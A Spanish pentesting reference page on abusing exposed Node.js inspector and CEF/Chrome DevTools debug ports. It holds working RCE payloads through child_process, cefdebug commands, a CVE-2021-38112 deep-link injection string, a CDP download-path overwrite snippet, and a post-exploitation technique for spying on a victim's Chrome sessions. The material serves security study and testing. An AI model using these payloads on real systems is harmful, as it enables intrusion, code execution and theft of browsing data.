# Abuso de debug de Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Los ejemplos prácticos históricos incluyen el walkthrough de Multimaster y el ataque al debugger de Visual Studio Code mediante CVE-2019-1414; úsalos como contexto específico de cada versión en lugar de asumir que todos los objetivos actuales de Electron o Chromium exponen las mismas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Información básica

[Según la documentación](https://nodejs.org/learn/getting-started/debugging): Cuando se inicia con el switch `--inspect`, un proceso de Node.js escucha a un cliente de debugging. De forma **predeterminada**, escuchará en el host y puerto **`127.0.0.1:9229`**. A cada proceso también se le asigna un **UUID** **único**.<sup>[[4]](#references)</sup>

Los clientes del inspector deben conocer y especificar la dirección del host, el puerto y el UUID para conectarse. Una URL completa tendrá un aspecto similar a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Dado que el **debugger tiene acceso completo al entorno de ejecución de Node.js**, un actor malicioso capaz de conectarse a este puerto podría ejecutar código arbitrario en nombre del proceso de Node.js (**posible escalada de privilegios**).<sup>[[4]](#references)</sup>

Hay varias formas de iniciar un inspector:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Al iniciar un proceso inspeccionado, aparecerá algo como esto:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Los procesos basados en **CEF** (**Chromium Embedded Framework**) pueden exponer un debugger con `--remote-debugging-port=9222`. Esto expone el navegador mediante el [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) en lugar de un inspector de Node.js, por lo que los payloads basados en `process` de Node.js no son directamente aplicables de forma predeterminada.<sup>[[2]](#references)[[5]](#references)</sup>

Cuando inicias un navegador depurado, aparecerá algo como lo siguiente:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Browsers, WebSockets y same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Los sitios web abiertos en un navegador web pueden realizar solicitudes WebSocket y HTTP según el modelo de seguridad del navegador. Es necesaria una **conexión HTTP inicial** para **obtener un identificador de sesión de debugger único**. La **same-origin-policy** **impide** que los sitios web puedan realizar **esta conexión HTTP**. Como medida de seguridad adicional contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js verifica que las **cabeceras 'Host'** de la conexión especifiquen exactamente una **dirección IP** o **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Estas **medidas de seguridad impiden explotar el inspector** para ejecutar código **simplemente enviando una solicitud HTTP** (lo que podría hacerse explotando una vulnerabilidad SSRF).<sup>[[4]](#references)</sup>

### Iniciar el inspector en procesos en ejecución

Puedes enviar la **señal SIGUSR1** a un proceso nodejs en ejecución para hacer que **inicie el inspector** en el puerto predeterminado. Sin embargo, ten en cuenta que necesitas tener suficientes privilegios, por lo que esto podría concederte **acceso privilegiado a la información dentro del proceso**, pero no una escalada directa de privilegios.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Esto es útil en containers porque **apagar el proceso e iniciar uno nuevo** con `--inspect` **no es una opción**, ya que el **container** será **eliminado** junto con el proceso.<sup>[[6]](#references)</sup>

### Conectarse al inspector/debugger

Para conectarse a un **navegador basado en Chromium**, se puede acceder a las URL `chrome://inspect` o `edge://inspect` para Chrome o Edge, respectivamente. Al hacer clic en el botón Configure, se debe comprobar que el **host y el puerto de destino** estén correctamente indicados. La imagen muestra un ejemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Después aparecerá una URL para acceder al debugger. p. ej., ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectarse al inspector/debugger: Para conectarse a un navegador basado en Chromium,...](<../../images/image (674).png>)

Usando la **línea de comandos**, puedes conectarte a un debugger/inspector con:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
La herramienta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspectores** que se ejecutan localmente e **inyectar código** en ellos.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Ten en cuenta que los exploits de **RCE en NodeJS** no funcionarán si están conectados a un navegador mediante [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (debes comprobar la API para encontrar cosas interesantes que hacer con ella).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE en el Debugger/Inspector de NodeJS

> [!TIP]
> Si has llegado aquí buscando cómo obtener [**RCE a partir de un XSS en Electron, consulta esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algunas formas comunes de obtener **RCE** cuando puedes **conectarte** a un **inspector** de Node consisten en usar algo como (parece que esto **no funcionará en una conexión con Chrome DevTools protocol**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Cargas útiles del Chrome DevTools Protocol

Puedes consultar la API aquí: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
En esta sección simplemente enumeraré cosas interesantes que he descubierto que la gente ha utilizado para explotar este protocolo.

### Inyección de parámetros mediante Deep Links

En [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security descubrió que una aplicación basada en CEF **registró una UR**I personalizada en el sistema (workspaces://index.html) que recibía la URI completa y después **inició la aplicació**n basada en CEF con una configuración que se construía parcialmente a partir de esa URI.<sup>[[8]](#references)</sup>

Se descubrió que los parámetros de la URI se decodificaban mediante URL y se utilizaban para iniciar la aplicación básica de CEF, lo que permitía a un usuario **inyectar** el flag **`--gpu-launcher`** en la **línea de comandos** y ejecutar cosas arbitrarias.<sup>[[8]](#references)</sup>

Por lo tanto, un payload como:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Ejecutará un calc.exe.<sup>[[8]](#references)</sup>

### Sobrescribir archivos

Cambia la carpeta donde se van a guardar los **archivos descargados** y descarga un archivo para **sobrescribir** el **código fuente** utilizado con frecuencia por la aplicación con tu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### RCE y exfiltration mediante WebDriver

STAR Labs demostró que los servicios WebDriver/CDP expuestos pueden permitir lecturas arbitrarias de archivos y RCE; el DNS rebinding puede completar la cadena de exploit en algunas configuraciones.<sup>[[9]](#references)</sup>

Para consultar casos históricos adicionales de browser automation y seguridad de Chromium, consulta el write-up de Counter WebDriver y los issues 773, 1742 y 1944 de Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Post-Exploitation

En un entorno real y **después de comprometer** un PC de usuario que utilice un navegador basado en Chrome/Chromium, podrías iniciar un proceso de Chrome con el **debugging activado y hacer port-forward del puerto de debugging** para poder acceder a él. De esta forma, podrás **inspeccionar todo lo que la víctima haga con Chrome y robar información sensible**.<sup>[[7]](#references)</sup>

La forma stealth consiste en **terminar todos los procesos de Chrome** y después ejecutar algo como:<sup>[[7]](#references)</sup>
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - herramienta de inspección y explotación del debugger de CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution de Visual Studio Code mediante Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guía de debugging de Node.js - Primeros pasos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Writeup de corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusando de la función de debugging de Chrome para observar y controlar sesiones de navegación de forma remota](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution en AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [¿Estás hablando conmigo? - WebDriver RCE mediante DNS Rebinding y CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Contra WebDriver - De Bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Incidencia 773 de Google Project Zero (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Incidencia 1742 de Google Project Zero (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Incidencia 1944 de Google Project Zero (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
{{#include ../../banners/hacktricks-training.md}}
